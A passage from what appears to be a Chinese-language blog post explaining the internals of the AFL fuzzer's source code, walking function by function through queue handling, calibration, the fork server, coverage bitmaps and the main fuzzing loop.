class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">q-&gt;fname        = fname;</span><br><span class="line">q-&gt;len          = len;</span><br><span class="line">q-&gt;depth        = cur_depth + <span class="number">1</span>;</span><br><span class="line">q-&gt;passed_det   = passed_det;</span><br></pre></td></tr></tbody></table></figure><p>如果<code>q-&gt;depth &gt; max_depth</code>，则设置max_depth为q-&gt;depth</p><p>如果queue_top不为空，则设置<code>queue_top-&gt;next为q，queue_top = q;</code>，否则<code>q_prev100 = queue = queue_top = q;</code></p><p>queue计数器queued_paths和待fuzz的样例计数器pending_not_fuzzed加一</p><p>cycles_wo_finds设置为0</p><p>如果<code>queued_paths % 100 = 0</code>，则<code>q_prev100-&gt;next_100 = q; q_prev100 = q;</code></p><p>设置<code>last_path_time = get_cur_time()</code></p><h4 id="load-auto"><a href="#load-auto" class="headerlink" title="load_auto"></a>load_auto</h4><blockquote><p>load自动生成的提取出来的词典token</p></blockquote><p>遍历50次</p><ul><li>以只读的方式打开<code>in_dir/.state/auto_extras/auto_%6u</code></li><li>如果打开失败，结束</li><li>如果打开成功，读取<code>MAX_AUTO_EXTRA+1</code>个字节到tmp里，长度保存到len中</li><li>调用<code>maybe_add_auto</code>按规则加入字典</li></ul><h4 id="pivot-inputs"><a href="#pivot-inputs" class="headerlink" title="pivot_inputs"></a>pivot_inputs</h4><blockquote><p>在<code>out_put</code>目录中为<code>input</code>测试用例创建硬链接</p></blockquote><p>遍历queue里的queue_entry</p><ul><li>找到q-&gt;fname最后一个/的位置，然后连带测试用例文件名称赋值给rsl</li><li>如果没有获取到上面的东西那么<code>rsl = q-&gt;fname</code>，如果获取到那么rsl就等于testcase的文件名（把前面的/给去了）</li><li>rsl前三个字节和<code>id:</code>比较，如果相等则把后面的部分化成%06u这种格式放入orig_id中，并且判断orig_id是否与id相等<ul><li>如果相等则设置<code>resuming_fuzz = 1</code></li><li>如果不相等，在rsl里寻找<code>,orig:</code><ul><li>如果找到了use_name指向后面</li><li>如果没有找到则use_name = rsl</li></ul></li><li><code>nfn = out_dir/queue/id:%06u,orig:use_name</code></li><li>创建硬链接，<code>q-&gt;fname</code>到nfn，<code>q-&gt;fname</code>指向这个nfn</li><li>如果<code>q-&gt;passed_detf</code>为1，则调用<code>mark_as_det_done(q)</code>，代表queue这一项已经fuzz过了</li><li>如果设置了<code>in_place_resume</code>，则调用<code>nuke_resume_dir</code>函数<ul><li>nuke_resume_dir这个函数删除了很多<code>out_dir/_resume/.stat/</code>目录下的东西</li><li>如果删除成功则正常返回，如果删除失败则异常</li></ul></li></ul></li></ul><h4 id="load-extras"><a href="#load-extras" class="headerlink" title="load_extras"></a>load_extras</h4><p>如果定义了extras_dir，那到加载extras_dir下的文件放入extra数组并排序</p><h4 id="find-timeout"><a href="#find-timeout" class="headerlink" title="find_timeout"></a>find_timeout</h4><p>如果<code>timeout_given</code>没有被设置则进入<code>find_timeout</code>函数，在不指定-t的情况下，防止不停的调整超时时间</p><p>如果resuming_fuzz为0，则直接return</p><p>如果<code>in_place_resume</code>为1，则<code>fn = alloc_printf("%s/fuzzer_stats", out_dir);</code>，否则<code>fn = alloc_printf("%s/../fuzzer_stats", in_dir);</code></p><p>只读方式打开fn，读取<code>sizeof(tmp) - 1)</code>大小的数据到tmp中，如果里面有<code>exec_timeout: </code>就读取这个值并且大于四<code>exec_tmout</code>就设置这个值，如果没有则直接返回，<code>timeout_given = 3</code></p><h4 id="detect-file-args"><a href="#detect-file-args" class="headerlink" title="detect_file_args"></a>detect_file_args</h4><p>检查输入argv中是否存在@@，有的话替换成out_dir/.cur_input</p><h4 id="setup-stdio-file"><a href="#setup-stdio-file" class="headerlink" title="setup_stdio_file"></a>setup_stdio_file</h4><p>如果out_file没有值（没有使用-f），则调用此函数，会删除原本的<code>out_dir/.cur_input</code>，创建一个新的<code>out_dir/.cur_input</code>，保存其文件描述符在out_fd中</p><h4 id="check-binary"><a href="#check-binary" class="headerlink" title="check_binary"></a>check_binary</h4><p>指定路径处要执行的程序是否存在，且它不能是一个shell script，同时检查elf文件头是否合法及程序是否被插桩</p><h4 id="get-cur-time"><a href="#get-cur-time" class="headerlink" title="get_cur_time"></a>get_cur_time</h4><p>获取时间</p><h4 id="perform-dry-run"><a href="#perform-dry-run" class="headerlink" title="perform_dry_run"></a>perform_dry_run</h4><blockquote><p>执行所有的测试用例，以检查是否按预期工作</p></blockquote><p>设置<code>cal_failures = 0</code>，读取<code>AFL_SKIP_CRASHES</code>环境变量到<code>skip_crashes</code>变量里</p><p>遍历queue</p><ul><li><p>打开q-&gt;fname，这里的q-&gt;fname就是在queue里面的id:000xxx这些文件，然后读取到use_mem中</p></li><li><p><code>res = calibrate_case(argv, q, use_mem, 0, 1);</code>，校准该测试用例，评估input文件夹下的case</p></li><li><p>如果stop_soon为1，则直接return</p></li><li><p>如果res的结果为crash_mode或者为<code>FAULT_NOBITS</code>，打印相关的信息</p></li><li><p>依据res的结果查看是哪种错误并进行判断。一共有以下几种错误类型</p><ul><li>FAULT_NONE<ul><li>如果q是第一个测试用例，调用<code>check_map_coverage()</code>函数，评估覆盖率</li><li>如果是crash_mode则，则异常，代表该测试用例不产生crash</li></ul></li><li>FAULT_TMOUT<ul><li>如果指定了-t参数，该测试用例产生超时错误。当<code>timeout_given</code>为2时跳过该文件</li></ul></li><li>FAULT_CRASH<ul><li>如果设置了crash_mod，直接break</li><li>如果设置了skip_crashes<ul><li>设置q-&gt;cal_failed为CAL_CHANCES</li><li>cal_fialures计数器+1</li></ul></li><li>如果设置了<code>mem_limit</code>，提示内存不够，抛出异常</li></ul></li><li>FAULT_ERROR<ul><li>目标程序无法执行，抛出异常</li></ul></li><li>FAULT_NOINST<ul><li>样例没有出现任何路径信息，抛出异常</li></ul></li><li>FAULT_NOBITS<ul><li>有路径信息但没新路径，认为这是无用路径，useless_at_start计数器加一</li></ul></li></ul></li><li><p>如果样例的var_behavior为真，则代表它多次运行，同样的输入条件下，却出现不同的覆盖信息，抛出警告信息</p></li><li><p>继续读取下面一个样例，直到所以样例读完为止</p></li><li><p>如果设置了<code>cal_failures</code></p><ul><li><code>cal_failures = queued_paths</code>代表所有用例均超时</li><li>计算<code>cal_failures \* 5</code>是否大于<code>queued_paths</code>，如果大于说明测试用例的问题比例很高，可能需要重新检查设置</li></ul></li></ul><p>输出所有testcase运行完成</p><h4 id="calibrate-case"><a href="#calibrate-case" class="headerlink" title="calibrate_case"></a>calibrate_case</h4><blockquote><p>校准input文件夹下的测试用例，判断该用例是否异常，以及发现新路径时，评估新发现的testcase行为是否可变（这里的可变是指多次执行这个case，发现的路径不同）</p></blockquote><p>如果<code>q-&gt;exec_cksum</code>为0，代表这是这个case第一次运行，即来自input文件夹下，所以将first_run置为1</p><p>保存原有的stage_cur、stage_max、stage_name</p><p>设置<code>use_tmout</code>为<code>exec_tmout</code>，如果<code>from_queue</code>是0或者<code>resuming_fuzz</code>被置为1，即代表不来自于queue中或者在<code>resuming sessions</code>的时候，则use_tmout的值被设置的更大，q-&gt;cal_failed++</p><p>设置<code>stage_name</code>为<code>calibration</code>，根据fast_cal是否为1来设置<code>stage_max</code>为3还是<code>CAL_CYCLES</code>（默认为8），含义是每个新测试用例（以及显示出可变行为的测试用例）的校准周期数，也就是说这个stage要执行几次的意思</p><p>如果不是dumb_mode模式，并且no_forkserver为0，forksrv_pid为0，则<code>init_forkserver(argv)</code>启动<code>fork server</code>（后面说）</p><p>如果这个queue不是来自input文件夹，而是评估新case，则此时<code>q-&gt;exec_cksum</code>不为空，拷贝trace_bits到first_trace里，然后计算<code>has_new_bits</code>的值，赋值给new_bits</p><p>获取时间</p><p>循环stage_max次</p><ul><li>如果这个queue不是来自input文件夹下，并且第一轮<code>calibration stage</code>执行结束时，刷新一次展示界面<code>show_stats</code>，用来展示这次执行的结果，此后不再展示</li><li><code>write_to_testcase</code>将从<code>q-&gt;fname</code>中读取的内容写入到<code>.cur_input</code>中</li><li><code>u8 run_target(argv, use_tmout)</code>，结果保存在fault中</li><li>如果出现终止或者fault结果不为crash_mode，跳转到abort_calibration</li><li>如果不是dumb_mode，并且是<code>calibration stage</code>为第一次运行，且共享内存里没有任何路径（即没有任何byte被置位）设置fault为<code>FAULT_NOINST</code>，然后<code>goto abort_calibration</code></li><li>计算<code>hash32(trace_bits, MAP_SIZE, HASH_CONST)</code>的结果，结果保存到cksum中</li><li>如果<code>q-&gt;exec_cksum</code>不等于cksum，即代表<strong>这是第一次运行，或者在相同的参数下，每次执行，cksum却不同，是一个路径可变的queue</strong><ul><li>如果hnb大于new_bits，设置new_bits的值为hnb</li><li>判断<code>q-&gt;exec_cksum</code>是否是可变queue，如果为1，则说明不是第一次执行queue<ul><li>遍历<code>MAP_SIZE</code>次，如果first_trace[i]不等于trace_bits[i]，<strong>代表发现了可变queue</strong>，且var_bytes为空，则将该字节设置为1，并将stage_max设置为<code>CAL_CYCLES_LONG</code>，即需要执行40次</li><li><code>var_detected=1</code></li></ul></li><li><code>q-&gt;exec_cksum</code>为0的话就代表是第一次执行这个queue<ul><li>设置<code>q-&gt;exec_cksum</code>的值为之前计算出来的本次执行的cksum</li><li>把<code>trace_bits</code>拷贝到<code>first_trace</code>中</li></ul></li></ul></li></ul><p>保存所有轮次总的执行时间，加到total_cal_us里，总的执行轮次，加到total_cal_cycles里</p><p>计算一些信息</p><ul><li>计算出单次执行时间的平均值保存到q-&gt;exec_us里</li><li>将最后一次执行所覆盖到的路径数保存到q-&gt;bitmap_size里</li><li><code>q-&gt;handicap = handicap;</code></li><li><code>q-&gt;cal_failed = 0;</code></li><li>total_bitmap_size里加上这个queue所覆盖到的路径数</li><li>total_bitmap_entries++</li><li><code>update_bitmap_score(struct queue_entry *q)</code></li></ul><p>如果不是dumb_mode，并且是第一次运行，并且fault里有值，并且new_bits为0，代表在这个样例所有轮次的执行里，都没有发现任何新路径和出现异常，设置fault为<code>FAULT_NOBITS</code></p><p>如果new_bits为2并且<code>q-&gt;has_new_cov</code>为0，则设置<code>q-&gt;has_new_cov</code>为1，并将<code>queued_with_cov</code>加一，代表有一个queue发现了新路径</p><p>如果这个queue是可变路径，即<code>var_detected</code>为1，则计算var_bytes里被置位的tuple个数，保存到<code>var_byte_count</code>里，代表这些tuple具有可变的行为</p><p>queue标记为一个variable</p><ul><li><p>创建符号连接<code>out_dir/queue/.state/variable_behavior/fname</code>，设置queue的var_behavior为1</p></li><li><p>设置queue的var_behavior为1</p></li><li><p>计数variable behavior的计数器<code>queued_variable</code>的值加一</p></li></ul><p>恢复之前的stage值</p><p>如果不是第一次运行这个queue，则<code>show_stats</code></p><p>返回fault值</p><h4 id="init-forkserver"><a href="#init-forkserver" class="headerlink" title="init_forkserver"></a>init_forkserver</h4><p>建立管道st_pipe和ctl_pipe</p><p>fork一个子进程，成功之后会出现两个进程，一个是父进程，一个是子进程，在子进程中，fork函数返回0，在父进程中，fork返回新创建子进程的进程ID</p><p>子进程和父进程都会向下执行，此时可以通过pid来使它们执行不同的代码<code>if(!forksrv_pid)</code></p><ul><li><p>首先是子进程</p><ul><li>重定向文件描述符1和2到<code>dev_null_fd</code>，相当于关闭了子进程的全部输出</li><li>如果指定了out_file则把文件描述符0重定向到<code>dev_null_fd</code>，否则重定向到out_fd</li><li>重定向<code>FORKSRV_FD</code>到ctl_pipe[0],重定向<code>FORKSRV_FD + 1</code>到st_pipe[1]<ul><li>子进程只能读取命令</li><li>子进程只能发送写出状态</li></ul></li><li>关闭子进程里的一些文件描述符</li><li>读取环境变量<code>LD_BIND_LAZY</code>，如果没有设置，则设置环境变量<code>LD_BIND_NOW</code>为1</li><li>设置环境变量<code>ASAN_OPTIONS</code>为<code>"abort_on_error=1:" "detect_leaks=0:" "symbolize=0:", "allocator_may_return_null=1"</code></li><li><code>MSAN_OPTIONS</code>也做相应的设置</li><li><code>execv(target_path, argv)</code><ul><li>execv会替换掉原有的进程空间为target_path代表的程序，所以相当于后续就是去执行target_path，这个程序结束的话，子进程就结束</li><li>而在这里非常特殊，第一个target会进入<code>__afl_maybe_log</code>里的<code>__afl_fork_wait_loop</code>，并充当fork server，在整个Fuzz的过程中，它都不会结束，每次要Fuzz一次target，都会从这个fork server fork出来一个子进程去fuzz</li></ul></li><li>使用一个独特的<code>bitmaps EXEC_FAIL_SIG(0xfee1dead)</code>写入trace_bits，来告诉父进程执行失败，并结束子进程。</li></ul></li><li><p>然后是父进程</p><ul><li>关闭ctl_pipe[0]和st_pipe[1]</li><li><code>fsrv_ctl_fd = ctl_pipe[1]</code>父进程只能发送(“写出”)命令</li><li><code>fsrv_st_fd = st_pipe[0]</code>父进程只能读取状态</li><li>等待fork server启动，但是不能等太久</li><li>从管道中读取4个字节放在status中，如果成功则代表fork server成功启动</li><li>如果超时则抛出异常</li></ul></li></ul><h4 id="has-new-bits"><a href="#has-new-bits" class="headerlink" title="has_new_bits"></a>has_new_bits</h4><blockquote><p>检查有没有新路径或者某个路径的执行次数有所不同</p></blockquote><p>初始化current和virgin为trace_bits和virgin_map的u64首元素地址，设置ret的值为0</p><p>8字节一组，每次从trace_bits，也就是共享内存里取出8个字节</p><ul><li><p>如果current不为0，并且<code>current &amp; virgin</code>不为0，代表current发现了新路径或者某条路径的执行次数和之前有所不同</p><ul><li><p>如果ret小于2</p><ul><li><p>cur指向current第一个字节，vir指向virgin的第一个字节</p></li><li><p>判断cur[i] &amp;&amp; vir[i]==0xff</p><ul><li><p>如果有一个为真则设置ret为2，代表发现了之前没有出现过的tuple（产生了新的路径覆盖）</p></li><li><p>如果没有则设置ret为1，代表只是命中次数更新</p></li></ul></li></ul></li><li><p><code>*virgin &amp;= ~*current</code></p></li></ul></li><li><p>current和virgin移动到下一组8个字节，直到MAPSIZE全被遍历完</p></li></ul><p>如果传入参数virgin_map的值为virgin_bits，且ret不为0，则设置bitmap_changed为1</p><h4 id="run-target"><a href="#run-target" class="headerlink" title="run_target"></a>run_target</h4><blockquote><p>通过子进程的方式执行目标应用，和前面的init_forkserver很像，但是这个函数处理了在设置了no_forkserver的情况的下的处理过程</p></blockquote><p>清空<code>trace_bits</code></p><p>如果设置了<code>dumb_mode</code>并且<code>no_forkserver</code>，则直接fork一个子进程，然后让子进程execv去执行target，如果execv执行失败，则向trace_bits写入<code>EXEC_FAIL_SIG</code></p><p>否则向控制管道中写入4个字节的prev_timed_out，命令fork server开始fork出一个子进程进行fuzz，然后从状态管道读取fork server返回的fork出的子进程的ID到<code>child_pid</code></p><p>上面两个都会设置计数器为timeout，如果超时，就杀死正在执行的子进程，并设置child_timed_out为1</p><p>计算执行时间，然后<code>total_execs++ </code>（执行次数计数器加一）</p><p>如果是dumb_mode，执行结束的状态码直接保存到status中，如果不是dumb_mode，则直接从状态管道中读取结束状态码</p><p>设置prev_timed_out的值为child_timed_out</p><p>接着依据status的值，向调用者返回结果</p><ul><li><code>WIFSIGNALED(status)</code>若为异常结束子进程返回的状态，则为真</li><li>如果是设置了uses_asan，必须使用特殊的退出代码</li><li>如果是dumb_mode，并且是no_forkserver，且trace_bits为<code>EXEC_FAIL_SIG</code>，就返回<code>FAULT_ERROR</code></li><li>如果最慢执行时间小于当前执行时间，并且<code>time_out</code>小于等于<code>exec_tmout</code>则更新<code>slowest_exec_ms</code>为<code>exec_ms</code></li></ul><p>返回<code>FAULT_NONE</code></p><h4 id="classify-counts"><a href="#classify-counts" class="headerlink" title="classify_counts"></a>classify_counts</h4><p>八字节一组循环去读，直到遍历完mem</p><ul><li>每次取两个字节</li><li>i从0到3，计算mem[i]的值，在<code>count_class_lookup16[mem16[i]]</code>中找到对应的取值付给<code>mem16[i]</code></li></ul><p>这样处理之后，对分支执行次数就会有一个简单的归类。例如，如果对某个测试用例处理时，分支A执行了32次；对另外一个测试用例，分支A执行了33次，那么AFL就会认为这两次的代码覆盖是相同的。当然，这样的简单分类肯定不能区分所有的情况，不过在某种程度上，处理了一些因为循环次数的微小区别，而误判为不同执行结果的情况</p><h4 id="count-bytes"><a href="#count-bytes" class="headerlink" title="count_bytes"></a>count_bytes</h4><p>初始化ret为0，循环读取mem里的值，每次读取4个字节到u32变量v中</p><ul><li>如果v是0，则代表这四个字节都是0，则继续</li><li>如果v不是0，则依次计算<code>v &amp; FF(0),v &amp; FF(1),v &amp; FF(2),v&amp;FF(3)</code>的结果，如果不为0，则计数器ret加一<ul><li><code>#define FF(_b) (0xff &lt;&lt; ((_b) &lt;&lt; 3))</code></li><li>也就是<code>0x000000ff</code>左移<code>(_b * 8)</code>位</li><li>最终结果可以是<code>0x000000ff</code>,<code>0x0000ff00</code>,<code>0x00ff0000</code>,<code>0xff000000</code>其中之一</li></ul></li></ul><h4 id="update-bitmap-score"><a href="#update-bitmap-score" class="headerlink" title="update_bitmap_score"></a>update_bitmap_score</h4><blockquote><p>每当发现新的路径，就调用这个函数来判断其是不是更加地favorable，这个favorable的意思是说是否包含最小的路径集合来遍历到所有bitmap中的位</p></blockquote><p>首先计算出这个case的fav_factor，计算方法是<code>q-&gt;exec_us * q-&gt;len</code>即执行时间和样例大小的乘积，以这两个指标来衡量权重</p><p>遍历trace_bits数组，如果该字节的值不为0，则代表这是已经被覆盖到的path</p><ul><li>然后检查对应于这个path的top_rated是否存在<ul><li>如果存在，则比较<code>fav_factor &gt; top_rated[i]-&gt;exec_us * top_rated[i]-&gt;len</code>，即比较执行时间和样例大小的乘积，哪个更小<ul><li>如果<code>top_rated[i]</code>的更小，则代表<code>top_rated[i]</code>的更优，不做任何处理，继续遍历下一个path</li><li>如果该path长度top_rated乘积更大，则将top_rated对应的tc_ref字段-1，并将其trace_mini字段置为空</li></ul></li><li>设置<code>top_rated[i]</code>为q，即当前case，也就是替换成最优，然后将其tc_ref的值加一</li><li>如果<code>q-&gt;trace_mini</code>为空，则将trace_bits经过<code>minimize_bits</code>压缩，然后存到trace_mini字段里</li><li>设置score_changed为1</li></ul></li></ul><h4 id="minimize-bits"><a href="#minimize-bits" class="headerlink" title="minimize_bits"></a>minimize_bits</h4><blockquote><p>压缩数据大小，将数据本身转换成位置记录下来（是否覆盖到和覆盖了多少次的byte，压缩成是否覆盖到的bit）</p></blockquote><p>这个就是个算法，算法意思就是如果15这里有值，正常存放到数组中，这样子就需要[14]，如果上亿个数的话，内存吃不消</p><p>所以就有了bitmap这个东西，运用bitmap的话，一个二进制数就代表对应的num是否有值，也就是上面的15，<code>0000000000000001</code>这样子就代表15有值</p><p>分8字节一组，byte[0]和byte[1]，15在byte[1]里，相对byte[1]里offset为7，设index为字节数组的下标，position为字节内部偏移</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">{</span><br><span class="line"><span class="type">int</span> index = num &gt;&gt; <span class="number">3</span>;<span class="comment">// num/8得到byte[]的index</span></span><br><span class="line"><span class="type">int</span> position = num &amp; <span class="number">0x07</span>; <span class="comment">// num%8得到在byte[index]的位置</span></span><br><span class="line"><span class="type">int</span> val = <span class="number">1</span> &lt;&lt; position;<span class="comment">//将1左移position后，那个位置自然就是1</span></span><br><span class="line">    byte[index] = byte[index] | val; <span class="comment">//，然后和以前的数据做|，这样，那个位置就替换成1了。</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>这样子算下来就能精确的把二进制数据的15那个位置从0变成1</p><h4 id="cull-queue"><a href="#cull-queue" class="headerlink" title="cull_queue"></a>cull_queue</h4><blockquote><p>精简队列</p></blockquote><p>如果设置了dumb_mode或没有设置scor_changed，直接返回</p><p>设置score_changed的值为0</p><p>将temp_v的值初始化成0xff，每位如果为1代表还没有被覆盖到，如果为0就代表已经被覆盖到了</p><p>设置queued_favored为0，pending_favored为0</p><p>遍历queue队列，设置其favored的值都为0</p><p>循环<code>MAP_SIZE</code>次</p><ul><li><p>判断该path对应的bit有没有被置位</p><ul><li><p>如果<code>top_rated[i]</code>有值，且该path在temp_v里被置位</p><ul><li>从temp_v中清除掉所有top_rated[i]覆盖到的path，将对应的bit设置为0</li></ul></li><li><p>设置<code>top_rated[i]-&gt;favored</code>为1，queued_favored计数器加一</p></li><li><p>如果<code>top_rated[i]</code>的was_fuzzed字段是0，代表其还没有fuzz过，则将pending_favored计数器加一</p></li></ul></li></ul><p>遍历queue</p><ul><li><p><code>mark_as_redundant</code></p></li><li><p>如果不是favored的case，就被标记成redundant_edges</p></li></ul><h4 id="mark-as-redundant"><a href="#mark-as-redundant" class="headerlink" title="mark_as_redundant"></a>mark_as_redundant</h4><p>如果<code>state和q-&gt;fs_redundant</code>相等，就直接返回</p><p>设置<code>q-&gt;fs_redundant</code>的值为state</p><p>如果state的值为1</p><ul><li>创建<code>out_dir/queue/.state/redundant_edges/fname</code></li></ul><p>如果state的值不为1</p><ul><li>尝试删除路径<code>out_dir/queue/.state/redundant_edges/fname</code></li></ul><h4 id="show-init-stats"><a href="#show-init-stats" class="headerlink" title="show_init_stats"></a>show_init_stats</h4><blockquote><p>在处理输入目录的末尾显示统计信息，以及一堆警告,以及几个硬编码的常量</p></blockquote><p>total_cal_us总轮次执行时间、total_cal_cycles总执行轮次，<code>avg_us = total_cal_us / total_cal_cycles</code>，计算出平均单轮执行时间avg_us</p><p>遍历queue</p><ul><li>更新<code>min_us、max_us、min_bits、max_bits、max_len</code></li></ul><p>如果avg_us大于10000就警告</p><p>如果avg_us大于50000，设置havoc_div为10</p><p>大于20000，设置havoc_div为5</p><p>如果大于10000，设置havoc_div为2</p><p>如果不是<code>resuming session</code>，则对queue的大小和个数超限提出警告，且如果<code>useless_at_start</code>不为0，就警告有可以精简的样本。</p><p>如果<code>timeout_given</code>为0</p><ul><li>根据<code>avg_us</code>来计算出<code>exec_tmout</code></li><li>avg_us的单位是微秒，而exec_tmout单位是毫秒，所以需要除以1000</li><li>在上面计算出来的<code>exec_tmout</code>和所有样例中执行时间最长的样例进行比较，取最大值赋给<code>exec_tmout</code></li><li>如果<code>exec_tmout</code>大于<code>EXEC_TIMEOUT</code>，就设置<code>exec_tmout = EXEC_TIMEOUT</code></li><li>设置<code>timeout_given</code>为1</li></ul><p>如果<code>timeout_give</code>不为0，且为3，代表这是<code>resuming session</code></p><p>如果是<code>dumb_mode</code>且没有设置环境变量<code>AFL_HANG_TMOUT</code></p><ul><li>设置<code>hang_tmout</code>为<code>EXEC_TIMEOUT</code>和<code>exec_tmout * 2 + 100</code>中的最小值</li></ul><h4 id="find-start-position"><a href="#find-start-position" class="headerlink" title="find_start_position"></a>find_start_position</h4><blockquote><p>主要作用为在resume时，尝试查找要开始的队列的位置</p></blockquote><p>如果不是<code>resuming_fuzz</code>，则直接返回</p><p>如果是in_place_resume,就打开<code>out_dir/fuzzer_stats</code>文件，否则打开<code>in_dir/../fuzzer_stats</code>文件</p><p>读文件内容到tmp中，找到<code>cur_path</code>，并设置为ret的值，如果大于<code>queued_paths</code>就设置ret为0，返回ret</p><h4 id="write-stats-file"><a href="#write-stats-file" class="headerlink" title="write_stats_file"></a>write_stats_file</h4><blockquote><p>更新统计信息文件以进行无人值守的监视</p></blockquote><p>创建<code>out_dir/fuzzer_stats</code>文件</p><p>打开并写入统计信息</p><ul><li>start_time<ul><li>fuzz运行的开始时间，start_time / 1000</li></ul></li><li>last_update<ul><li>当前时间</li></ul></li><li>fuzzer_pid<ul><li>获取当前pid</li></ul></li><li>cycles_done<ul><li><code>queue_cycle</code>在<code>queue_cur</code>为空，即执行到当前队列尾的时候才增加1，所以这代表queue队列被完全变异一次的次数。</li></ul></li><li>execs_done<ul><li>total_execs，target的总的执行次数，每次<code>run_target</code>的时候会增加1</li></ul></li><li>execs_per_sec<ul><li>每秒执行的次数</li></ul></li><li>paths_total<ul><li>queued_paths在每次<code>add_to_queue</code>的时候会增加1，代表queue里的样例总数</li></ul></li><li>paths_favored<ul><li>queued_favored，有价值的路径总数</li></ul></li><li>paths_found<ul><li>queued_discovered在每次<code>common_fuzz_stuff</code>去执行一次fuzz时，发现新的interesting case的时候会增加1，代表在fuzz运行期间发现的新queue entry。</li></ul></li><li>paths_imported<ul><li>queued_imported是master-slave模式下，如果sync过来的case是interesting的，就增加1</li></ul></li><li>max_depth<ul><li>最大路径深度</li></ul></li><li>cur_path<ul><li>current_entry一般情况下代表的是正在执行的queue entry的整数ID,queue首节点的ID是0</li></ul></li><li>pending_favs<ul><li>pending_favored 等待fuzz的favored paths数</li></ul></li><li>pending_total<ul><li>pending_not_fuzzed 在queue中等待fuzz的case数</li></ul></li><li>variable_paths<ul><li>queued_variable在<code>calibrate_case</code>去评估一个新的test case的时候，如果发现这个case的路径是可变的，则将这个计数器加一，代表发现了一个可变case</li></ul></li><li>stability</li><li>bitmap_cvg</li><li>unique_crashes<ul><li>unique_crashes这是在<code>save_if_interesting</code>时，如果fault是FAULT_CRASH，就将unique_crashes计数器加一</li></ul></li><li>unique_hangs<ul><li>unique_hangs这是在<code>save_if_interesting</code>时，如果fault是FAULT_TMOUT，且exec_tmout小于hang_tmout，就以hang_tmout为超时时间再执行一次，如果还超时，就让hang计数器加一。</li></ul></li><li>last_path<ul><li>在<code>add_to_queue</code>里将一个新case加入queue时，就设置一次last_path_time为当前时间，<code>last_path_time / 1000</code></li></ul></li><li>last_crash<ul><li>同上，在unique_crashes加一的时候，last_crash也更新时间，<code>last_crash_time / 1000</code></li></ul></li><li>last_hang<ul><li>同上，在unique_hangs加一的时候，last_hang也更新时间，<code>last_hang_time / 1000</code></li></ul></li><li>execs_since_crash<ul><li>total_execs - last_crash_execs,这里last_crash_execs是在上一次crash的时候的总计执行了多少次</li></ul></li><li>exec_tmout<ul><li>配置好的超时时间，有三种可能的配置方式，见上文</li></ul></li></ul><p>写入文件之后关闭文件</p><h4 id="save-auto"><a href="#save-auto" class="headerlink" title="save_auto"></a>save_auto</h4><blockquote><p>保存自动生成的extras</p></blockquote><p>如果<code>auto_changed</code>为0，则直接返回</p><p>如果不为0，就设置为0，然后创建名为<code>alloc_printf("%s/queue/.state/auto_extras/auto_%06u", out_dir, i);</code>的文件，并写入a_extras的内容</p><p>上面的前置结束之后，如果是终端环境，会睡4秒，开始时间会加上4秒</p><h3 id="Fuzz主循环"><a href="#Fuzz主循环" class="headerlink" title="Fuzz主循环"></a>Fuzz主循环</h3><p>在进行第一轮fuzz之后进入fuzz主循环</p><p>首先精简队列</p><p>如果<code>queue_cur</code>为空，代表所有queue都被执行完一轮</p><ul><li><p>设置<code>queue_cycle</code>计数器加一，即代表所有queue被完整执行了多少轮</p></li><li><p>设置<code>current_entry</code>为0，和<code>queue_cur</code>为queue首元素，开始新一轮fuzz</p></li><li><p>如果是<code>resume fuzz</code>情况，则先检查seek_to是否为空，如果不为空，就从seek_to指定的queue项开始执行</p></li><li><p>刷新展示界面<code>show_stats</code></p></li><li><p>如果执行一次完整的扫描之后，新发现的路径数与执行之前的一样，这代表没有发现任何新的路径</p><ul><li>如果<code>use_splicing</code>为1，就设置<code>cycles_wo_finds</code>计数器加1，本次扫描无新路径</li><li>否则<code>use_splicing</code>为1，代表我们接下来要通过splice重组queue里的case</li></ul></li><li><p>如果执行后和执行前路径数不一样，那么设置<code>cycles_wo_finds</code>为0</p></li><li><p>更新<code>prev_queued</code></p></li><li><p>如果设置了<code>sync_id</code>并且<code>queue_cycle==1</code>并且能过获取<code>AFL_IMPORT_FIRS</code>T环境变量</p><ul><li>利用<code>sync_fuzzers</code>读取其他sync文件夹下的queue文件，然后保存到自己的queue里</li></ul></li><li><p>执行<code>skipped_fuzz = fuzz_one(use_argv)</code>来对queue_cur进行一次测试，如果不执行返回1，否则返回0</p></li><li><p>如果skipped_fuzz为0，且存在sync_id</p><ul><li><code>sync_interval_cnt</code>计数器+1，对<code>SYNC_INTERVAL</code>(默认为5)求余，即如果是5的倍数</li><li>调用sync_fuzzers，同步其他fuzzers</li></ul></li><li><p><code>queue_cur = queue_cur-&gt;next;current_entry++;</code>，开始测试下一个queue</p></li></ul><h4 id="sync-fuzzers"><a href="#sync-fuzzers" class="headerlink" title="sync_fuzzers"></a>sync_fuzzers</h4><blockquote><p>读取其他sync文件夹下的queue文件，然后保存到自己的queue里</p></blockquote><p>打开<code>sync_dir</code>文件夹</p><p>循环读取文件夹下的目录和文件</p><ul><li>跳过<code>.</code>开头的文件和<code>sync_id</code>即我们自己的输出文件夹</li><li>尝试打开<code>sync_dir/sd_ent-&gt;d_name/queue</code></li><li>尝试打开<code>out_dir/.synced/sd_ent-&gt;d_name</code>，读取4个字节到min_accept中，设置<code>next_min_accept</code>为<code>min_accept</code>，这个值代表之前从这个文件夹里读取到的最后一个queue的id</li><li>设置stage_name为<code>sprintf(stage_tmp, "sync %u", ++sync_cnt);</code>，设置stage_cur为0，stage_max为0</li><li>循环读取<code>sync_dir/sd_ent-&gt;d_name/queue</code>文件夹里的目录和文件<ul><li>跳过<code>.</code>开头的文件和标识小于<code>min_accept</code>的文件，因为这些文件应该已经被sync过了</li><li>如果<code>syncing_case</code>标识大于等于<code>next_min_accept</code><ul><li><code>next_min_accept = syncing_case + 